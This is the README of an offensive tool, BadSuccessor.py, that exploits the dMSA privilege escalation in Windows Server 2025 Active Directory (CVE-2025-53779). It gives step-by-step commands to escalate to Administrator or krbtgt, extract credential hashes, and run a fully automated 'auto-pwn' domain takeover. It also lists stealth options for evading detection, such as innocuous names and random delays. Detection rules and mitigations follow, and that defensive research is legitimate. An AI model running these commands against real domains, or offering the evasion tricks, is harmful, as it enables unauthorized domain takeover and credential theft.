# BadSuccessor.py

A penetration testing tool that exploits the dMSA (delegated Managed Service Account) privilege escalation vulnerability in Windows Server 2025 Active Directory environments.

## Legal Disclaimer

This tool is for authorized penetration testing and security research only. Using it against systems without explicit written permission is illegal. The authors are not responsible for misuse or damage.

The tool is under active development; behavior may vary across Windows Server 2025 builds and schema variations. Test in a non-production environment first, and report issues or submit PRs for compatibility fixes.

## Overview

BadSuccessor exploits a privilege escalation vulnerability in Windows Server 2025's delegated Managed Service Account (dMSA) feature. It allows an attacker with minimal permissions to escalate to any user in the domain, including Domain Administrators.

**Patch status:** Tracked as **CVE-2025-53779** (CVSS 7.2, relative path traversal in dMSA). Disclosed by Akamai on 2025-05-21 and fixed in Microsoft's **August 2025 Patch Tuesday**. Akamai notes the patch mitigates much of the risk but the underlying technique stays relevant, so this tool remains useful against unpatched or misconfigured environments.

Research by **Yuval Gordon** (Akamai): [Abusing dMSA to Escalate Privileges in Active Directory](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory).

## Vulnerability Details

The vulnerability exists in the dMSA migration process:
1. An attacker creates a dMSA in any writable OU
2. Sets `msDS-ManagedAccountPrecededByLink` (or `ms-DS-Managed-Account-Preceded-By-Link`) to a target user
3. Sets `msDS-DelegatedMSAState` (or `ms-DS-Delegated-MSA-State`) to `2` (migration completed)
4. The KDC grants the dMSA all of the target user's privileges via PAC inheritance

Additionally, the KERB-DMSA-KEY-PACKAGE structure contains the target user's password keys, enabling credential extraction.

## Prerequisites

### System Requirements
- Linux machine (non-domain joined)
- Python 3.8+ (developed and tested on 3.14)
- Network access to the target Active Directory environment
- Target domain with at least one Windows Server 2025 Domain Controller

### Python Dependencies
```bash
pip3 install ldap3 pyasn1 pycryptodome
pip3 install impacket==0.12.0
```

The tool targets impacket 0.12.0 and also runs on newer releases (tested with 0.13.1). A version-mismatch warning is printed at runtime and can be ignored on supported newer versions.

### Optional Dependencies
```bash
# DNS-based DC discovery
pip3 install dnspython

# Kerberos system packages
# Ubuntu/Debian
sudo apt-get install libkrb5-dev libgssapi-krb5-2
# RHEL/CentOS/Fedora
sudo yum install krb5-devel
```

### Required Permissions
- Valid domain credentials (any user account)
- **Any** of the following on at least one Organizational Unit:
  - `CreateChild`, `Write`, `GenericWrite`, or `GenericAll`
  - Membership in a default group with write access (e.g., Authenticated Users)
- The tool discovers writable OUs and reports the specific permissions found.

## Installation

```bash
git clone https://github.com/cybrly/badsuccessor.git
cd badsuccessor
pip3 install -r requirements.txt
chmod +x badsuccessor.py
```

`requirements.txt`:
```
ldap3>=2.9.1
pyasn1>=0.4.8
pycryptodome>=3.15.0
impacket==0.12.0
dnspython>=2.1.0
```

## Testing

Unit tests cover the DACL/ACE parsing, the GUID helper, and session handling. They need no live Active Directory.

```bash
pip3 install impacket   # test dependency
python3 -m unittest discover -s tests
```

## Usage

### Basic Syntax
```bash
python3 badsuccessor.py -d <domain> -u <username> -p <password> [options]
```

### Examples

Dry run (no changes made):
```bash
python3 badsuccessor.py -d corp.local -u john -p Password123 --dry-run --target Administrator
python3 badsuccessor.py -d corp.local -u john -p Password123 --dry-run --target Administrator --ou-dn "OU=ServiceAccounts,DC=corp,DC=local"
```

Enumerate the environment:
```bash
python3 badsuccessor.py -d corp.local -u john -p Password123 --check-schema
python3 badsuccessor.py -d corp.local -u john -p Password123 --enumerate
python3 badsuccessor.py -d corp.local -u john -p Password123 --list-targets
python3 badsuccessor.py -d corp.local -u john -p Password123 --validate-target Administrator
```

Perform the attack:
```bash
python3 badsuccessor.py -d corp.local -u john -p Password123 --attack --target Administrator

python3 badsuccessor.py -d corp.local -u john -p Password123 --attack --target Administrator --stealth --random-delay 30

python3 badsuccessor.py -d corp.local -u john -p Password123 --attack --target krbtgt \
  --dmsa-name legit_service --dmsa-description "Legitimate Service Account" \
  --dmsa-display-name "Production Service"

python3 badsuccessor.py -d corp.local -u john -p Password123 --attack --target Administrator \
  --dmsa-pattern "svc{random}prod"
```

Extract credentials:
```bash
python3 badsuccessor.py -d corp.local -u john -p Password123 --extract-creds --targets Administrator,krbtgt,svc_sql
python3 badsuccessor.py -d corp.local -u john -p Password123 --auto-pwn
```

Session management:
```bash
python3 badsuccessor.py -d corp.local -u john -p Password123 --list-sessions
python3 badsuccessor.py -d corp.local -u john -p Password123 --session-id corp_local_john_1234567890_abcd1234
python3 badsuccessor.py -d corp.local -u john -p Password123 --cleanup-session SESSION_ID
python3 badsuccessor.py -d corp.local -u john -p Password123 --cleanup-all
```

Export results:
```bash
python3 badsuccessor.py -d corp.local -u john -p Password123 --enumerate --export-json results.json
python3 badsuccessor.py -d corp.local -u john -p Password123 --enumerate --export-csv writable_ous.csv
python3 badsuccessor.py -d corp.local -u john -p Password123 --enumerate --export-html report.html
python3 badsuccessor.py -d corp.local -u john -p Password123 --attack --target Administrator \
  --export-json attack_results.json --export-html attack_report.html
```

### Command Line Options

**Authentication**
| Option | Description |
|--------|-------------|
| `-d, --domain` | Target domain (e.g., corp.local) **[required]** |
| `-u, --username` | Username for authentication **[required]** |
| `-p, --password` | Password for authentication |
| `--dc-ip` | Domain Controller IP (auto-discover if omitted) |
| `--ldaps` | Force LDAPS (SSL) connection on port 636 |

**Attack Modes**
| Option | Description |
|--------|-------------|
| `--attack` | Perform the BadSuccessor attack |
| `--dry-run` | Simulate the attack without making changes |
| `--extract-creds` | Extract credentials using the key package |
| `--auto-pwn` | Fully automated domain takeover |

**Target Specification**
| Option | Description |
|--------|-------------|
| `--target` | Target user to escalate to |
| `--targets` | Comma-separated users for credential extraction |
| `--validate-target` | Validate a target account without attacking |

**dMSA Configuration**
| Option | Description |
|--------|-------------|
| `--dmsa-name` | Name for the dMSA (auto-generated if omitted) |
| `--dmsa-pattern` | Naming pattern (e.g., `svc{random}{target}`) |
| `--ou-dn` | Specific OU DN to use (auto-detect if omitted) |
| `--dmsa-description` | Description for the created dMSA |
| `--dmsa-display-name` | Display name for the created dMSA |

**Enumeration**
| Option | Description |
|--------|-------------|
| `--enumerate` | Enumerate OUs with any write permissions |
| `--list-targets` | List high-value targets |
| `--check-schema` | Verify Windows Server 2025 schema |

**Session Management**
| Option | Description |
|--------|-------------|
| `--session-id` | Resume an existing session |
| `--list-sessions` | List all available sessions |
| `--cleanup-session SESSION_ID` | Clean up all dMSAs from a session |

**Cleanup**
| Option | Description |
|--------|-------------|
| `--cleanup` | Remove a created dMSA |
| `--dmsa-dn` | dMSA DN for cleanup |
| `--cleanup-all` | Clean up all dMSAs from the current session |

**Output**
| Option | Description |
|--------|-------------|
| `--export-json FILE` | Export results to JSON |
| `--export-csv FILE` | Export results to CSV |
| `--export-html FILE` | Generate an HTML report |
| `--no-banner` | Suppress the banner |
| `--verbose` | Verbose output |

**Stealth**
| Option | Description |
|--------|-------------|
| `--stealth` | Innocuous dMSA naming |
| `--random-delay SECONDS` | Random delay between operations (0–N seconds) |

## Attack Workflow

**Phase 1 — Reconnaissance**
1. Schema verification with dynamic attribute detection
2. Permission discovery across OUs (any write access, not just CreateChild)
3. Target account validation

**Phase 2 — Exploitation**
1. Optional dry run to test viability
2. dMSA creation with customizable attributes
3. Predecessor link and migration state set with schema awareness
4. Created objects tracked in the session for cleanup

**Phase 3 — Authentication**
1. Kerberos TGT request with inherited privileges
2. PAC analysis of inherited group memberships
3. Key package extraction with fallback methods

**Phase 4 — Post-Exploitation**
Generates ready-to-use commands for DCSync, remote command execution, lateral movement, and persistence.

## Features

- **Dynamic schema detection** — detects the attribute naming convention in use, with fallbacks across Windows Server 2025 builds.
- **Target validation** — flags disabled/locked/expired accounts, smartcard requirements, and delegation restrictions.
- **Session management** — tracks created objects for resume and bulk cleanup. Session state is JSON (not pickle), stored per-user in `$XDG_STATE_HOME/badsuccessor/sessions` (default `~/.local/state/badsuccessor/sessions`), written `0600`, with session ids sanitized against path traversal.
- **Dry run mode** — validates schema, permissions, and target without making changes.
- **Stealth** — innocuous naming patterns, random delays, customizable dMSA attributes.
- **Output formats** — JSON, CSV, and HTML.

Known limitation: the S4U2Self fallback in `KerberosAuthenticator` is a stub and not yet implemented.

## Detection

### Event IDs to Monitor
| Event ID | Source | Description |
|----------|--------|-------------|
| 5137 | Security | Directory service object creation (dMSA) |
| 5136 | Security | Directory service object modification |
| 2946 | Directory Service | Group Managed Service Account authentication |
| 4768 | Security | Kerberos TGT requested |
| 4769 | Security | Kerberos service ticket requested |

### Detection Rules
```
# Splunk
index=windows EventCode=5137
| where ObjectClass="msDS-DelegatedManagedServiceAccount" OR ObjectClass="ms-DS-Delegated-Managed-Service-Account"
| where NOT user IN ("approved_admins")

# Sigma
detection:
  selection:
    EventID: 5136
    AttributeLDAPDisplayName:
      - 'msDS-ManagedAccountPrecededByLink'
      - 'ms-DS-Managed-Account-Preceded-By-Link'
  condition: selection
```

### Behavioral Indicators
- Rapid creation and deletion of service accounts
- Non-administrative users creating dMSAs
- Unusual modifications to migration-related attributes
- Service accounts authenticating from unexpected sources
- dMSAs with suspicious naming patterns

## Mitigation

### Immediate
1. Restrict OU permissions:
   ```powershell
   Remove-ADPermission -Identity "OU=ServiceAccounts,DC=corp,DC=local" -User "Domain Users" -AccessRights CreateChild,Write,GenericWrite,GenericAll
   Get-ADPermission -Identity "OU=ServiceAccounts,DC=corp,DC=local" | Where-Object {$_.IdentityReference -match "Authenticated Users|Everyone"}
   ```
2. Audit dMSA creation (Event ID 5137) and changes to `msDS-ManagedAccountPrecededByLink` (Event ID 5136).
3. Deploy the detection rules above; alert on Event ID 2946 with an S-1-5-7 caller.

### Long-term
- Apply the Microsoft patch for CVE-2025-53779 (August 2025 Patch Tuesday); follow Microsoft's manual steps to create a dedicated service principal for the hybrid connection.
- Audit all write permissions (not just CreateChild) regularly.
- Enforce least privilege; consider disabling dMSA if unused.
- Add an approval workflow for service account creation.

## Impact (Akamai research)
- ~91% of surveyed environments had vulnerable permissions
- Works against default configurations
- Affects domains with Windows Server 2025 DCs
- Patched in August 2025 (CVE-2025-53779); still relevant against unpatched/misconfigured environments

## Technical Details

### dMSA Object Structure
```ldif
dn: CN=evil_dmsa,OU=ServiceAccounts,DC=corp,DC=local
objectClass: top
objectClass: msDS-GroupManagedServiceAccount
objectClass: msDS-DelegatedManagedServiceAccount
sAMAccountName: evil_dmsa$
userAccountControl: 4096
# Either naming convention may apply:
msDS-ManagedAccountPrecededByLink: CN=Administrator,CN=Users,DC=corp,DC=local
# or
ms-DS-Managed-Account-Preceded-By-Link: CN=Administrator,CN=Users,DC=corp,DC=local
msDS-DelegatedMSAState: 2
msDS-SupportedEncryptionTypes: 28
```

### Key Package Structure
KERB-DMSA-KEY-PACKAGE contains:
- Current keys — the dMSA's encryption keys
- Previous keys — the target user's encryption keys (including NTLM hash), enabling credential extraction without cracking

## Contributing

1. Fork the repository
2. Create a feature branch (`git checkout -b feature/enhancement`)
3. Commit your changes
4. Push and open a Pull Request

Guidelines: follow PEP 8, add unit tests for new behavior, update the docs, and test against multiple AD environments and schema naming conventions.

## Changelog

### Unreleased — Correctness & safety fixes
- **Fixed**: OU permission scan now detects `ACCESS_ALLOWED_OBJECT_ACE` (object ACEs), including `CreateChild` scoped to the dMSA class — the exact BadSuccessor primitive, previously missed entirely.
- **Fixed**: dMSA schema GUID (was the gMSA GUID); now read from the live schema `schemaIDGUID` with a correct constant fallback.
- **Fixed**: replaced the removed `ldaptypes.bin_to_string` call that silently broke DACL parsing on impacket 0.12+.
- **Fixed**: malformed service-account LDAP filter (spaces after `&`) that AD rejected.
- **Fixed**: `pkg_resources` (removed on Python 3.12+) replaced with `importlib.metadata`.
- **Security**: session state is JSON, not pickle; stored per-user at `0600` with path-traversal-safe session ids.
- **New**: unit tests under `tests/`.

### v2.3.0 (2025-05-28)
- Dry run mode, session management, target validation
- Export to JSON/CSV/HTML
- Stealth mode, customizable dMSA attributes, pattern-based naming, random delays
- Dynamic schema attribute detection; key package parsing with fallbacks
- Bulk cleanup; dependency version checking

### v2.2.0 (2025-05-27)
- Resolved impacket import issues; compatible with impacket 0.12.0
- Support for both dMSA attribute naming conventions
- More robust schema detection

### v2.1.0 (2025-05-25)
- ACL permission checking detects all write permissions
- Support for default groups (Authenticated Users, Everyone, etc.)
- More comprehensive OU enumeration (includes containers); shows per-OU permissions
- Detects protected users and delegation restrictions

### v2.0.0 (2025-05-24)
- Kerberos authentication; KERB-DMSA-KEY-PACKAGE extraction
- ACL permission checking; Windows Server 2025 schema verification
- Mass credential extraction; auto-pwn; target enumeration; post-exploitation commands

## References
- [Akamai research](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [CVE-2025-53779 (MSRC)](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53779)
- [Issue #1 — Enhanced permission checking](https://github.com/cybrly/badsuccessor/issues/1)
- [Issue #2 — Schema attribute naming](https://github.com/cybrly/badsuccessor/issues/2)

## Known Issues
- Some environments use different attribute naming conventions (handled by dynamic detection)
- Hash authentication requires a password in the current implementation
- Some environments require manual Kerberos configuration
- Detection rules need per-environment tuning

## Troubleshooting

Import errors with impacket:
```bash
pip3 uninstall impacket
pip3 install impacket==0.12.0
python3 -c "import impacket; print(impacket.__version__)"
```

Schema detection failures — check the actual attribute names on a DC:
```powershell
Get-ADObject -Filter {name -like "*delegated*" -or name -like "*preceded*"} -SearchBase "CN=Schema,CN=Configuration,DC=corp,DC=local" | Select Name
```

Permission issues — use dry run and verbose enumeration:
```bash
python3 badsuccessor.py -d corp.local -u john -p Password123 --dry-run --target Administrator
python3 badsuccessor.py -d corp.local -u john -p Password123 --enumerate --verbose
```

Clean up stale sessions:
```bash
rm -rf ~/.local/state/badsuccessor/sessions/
```

## Contact
Open a GitHub issue. Follow responsible disclosure practices.
